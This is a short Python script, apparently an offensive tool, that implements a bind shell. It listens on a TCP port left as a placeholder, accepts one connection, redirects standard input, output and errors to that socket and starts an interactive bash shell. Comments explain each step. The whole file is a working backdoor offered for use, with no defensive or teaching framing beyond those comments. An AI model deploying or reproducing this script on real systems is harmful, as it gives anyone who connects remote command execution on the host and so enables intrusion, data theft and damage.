import socket,os, subprocess

#### ADD IP ADDRESS AND PORT ####

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)    # create TCP socket
s.bind(('ip address','port'))                           # bind the socket to an ip address and a port number
s.listen(1)                                             # listen for incoming connections
shell_socket,addr = s.accept()                          # accept incoming connection

#redirect user input , the output and the errors to the socket
os.dup2(shell_socket.fileno(),0);                       # 0 means standard Input (STDIN)
os.dup2(shell_socket.fileno(),1);                       # 1 means standard Output (STDOUT)
os.dup2(shell_socket.fileno(),2);                       # 2 means standard Errors (STDERR)

# execute /bin/bash shell using subprocess
p = subprocess.call(["/bin/bash","-i"])
